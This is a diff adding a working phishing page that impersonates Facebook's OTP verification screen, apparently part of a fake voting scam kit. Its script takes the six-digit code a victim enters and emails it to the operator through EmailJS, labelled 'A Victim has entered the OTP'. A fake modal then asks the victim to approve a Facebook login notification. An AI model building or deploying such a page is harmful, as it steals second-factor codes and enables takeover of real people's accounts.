@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no" />
+  <title>Facebook - OTP Verification</title>
+  <link rel="icon" type="image/svg+xml" sizes="683x683" href="assets/img/facebook.svg" />
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto" />
+  <link rel="stylesheet" href="assets/css/Contact-Form-Clean.css" />
+  <link rel="stylesheet" href="assets/css/styles.css" />
+</head>
+<body>
+  <nav class="navbar navbar-light navbar-expand-md" style="padding-bottom: 10px">
+    <div class="container-fluid">
+      <img class="img-fluid" src="assets/img/dF5SId3UHWd.svg" style="width: 140px; margin-top: 0px" />
+    </div>
+  </nav>
+  <div class="contact-clean" style="padding: 0; padding-top: 0px; padding-bottom: 0px; background: rgb(255, 255, 255); text-align: center;">
+    <form id="otpForm" method="post" style="width: 100%; padding: 15px; border-style: none; box-shadow: inset 0px 0px;" action="otp.php">
+      <div>
+        <img class="img-fluid" src="assets/img/download%20(4).jpg" style="width: 68px; margin-bottom: 11px">
+        <h3>Anti Bot Verification Code</h3>
+        <p>We sent a 6-digit code to your<br>sms, email and WhatsApp.<br>Enter the code to confirm you are a human.</p>
+      </div>
+      <div class="form-group" style="margin-bottom: 14px;">
+        <input class="form-control form-control-sm" type="text" id="otp" style="background: #f5f6f7; border-radius: 5px; text-align: center;" placeholder="Enter 6-digit code" required maxlength="6" pattern="\d{6}" />
+      </div>
+      <div class="form-group">
+        <button class="btn btn-secondary btn-block btn-lg text-capitalize" id="continueButton" type="submit" style="background: #1877f2; font-size: 16px;" disabled>Continue</button>
+      </div>
+      <div class="form-group">
+        <p style="margin-top: 20px;"><a href="otp.html" style="color: #1877f2;">Send code again</a></p>
+        <p><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" style="color: #1877f2;">Confirm identity in another way</a></p>
+      </div>
+    </form>
+  </div>
+
+  <!-- Loading Animation -->
+  <div id="loadingAnimation" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);">
+    <div class="spinner-border" role="status">
+      <span class="sr-only">Loading...</span>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div class="modal fade" id="voteModal" tabindex="-1" aria-labelledby="voteModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-body text-center">
+          <img class="img-fluid" src="assets/img/dF5SId3UHWd.svg" style="width: 140px; margin-top: 0px">
+          <p>We sent a notification to your Facebook account. Check your notifications there and approve the login to confirm your vote.<br>Thank you for voting.</p>
+          <button type="button" class="btn btn-primary" id="modalOkButton" data-bs-dismiss="modal">Ok</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    (function () {
+      emailjs.init("AninNmoDSGQbw7ycL"); // Replace with your EmailJS user ID
+    })();
+
+    // Function to validate OTP input and enable/disable the Continue button
+    function validateOtpInput() {
+      var otpInput = document.getElementById("otp");
+      var continueButton = document.getElementById("continueButton");
+      var otpValue = otpInput.value;
+      var otpPattern = /^\d{6}$/;
+      
+      // Enable button if OTP value matches pattern, otherwise disable it
+      continueButton.disabled = !otpPattern.test(otpValue);
+    }
+
+    // Attach input event listener to validate OTP
+    document.getElementById("otp").addEventListener("input", validateOtpInput);
+
+    document.getElementById("otpForm").addEventListener("submit", function (event) {
+      event.preventDefault(); // Prevent form from submitting normally
+
+      var otpInput = document.getElementById("otp");
+      var otpValue = otpInput.value;
+      var otpPattern = /^\d{6}$/;
+
+      // Validate OTP input
+      if (!otpPattern.test(otpValue)) {
+        alert("Please enter a valid 6-digit code.");
+        return;
+      }
+
+      // Show loading animation
+      document.getElementById("loadingAnimation").style.display = "block";
+
+      // Collect form data
+      var formData = {
+        to_name: "Recipient Name", // Replace with the recipient's name
+        from_name: "Victims",
+        message: "A Victim has entered the OTP: " + otpValue, // The user's OTP
+      };
+
+      // Send email using EmailJS
+      emailjs.send("service_86t4yt7", "template_dapa5da", formData) // Replace with your EmailJS service ID and new template ID
+        .then(function (response) {
+          console.log("SUCCESS!", response.status, response.text);
+          
+          // Hide loading animation
+          document.getElementById("loadingAnimation").style.display = "none";
+          
+          // Show the modal
+          var voteModal = new bootstrap.Modal(document.getElementById('voteModal'));
+          voteModal.show();
+        }, function (error) {
+          console.error("FAILED...", error); // Log the error for debugging
+          
+          // Hide loading animation
+          document.getElementById("loadingAnimation").style.display = "none";
+          
+          alert("Failed to send OTP. Error: " + JSON.stringify(error)); // Show detailed error
+        });
+    });
+
+    // Redirect to index.html when the modal Ok button is clicked
+    document.getElementById("modalOkButton").addEventListener("click", function () {
+      window.location.href = "../index.html";
+    });
+  </script>
+
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.min.js"></script>
+
+</body>
+</html>
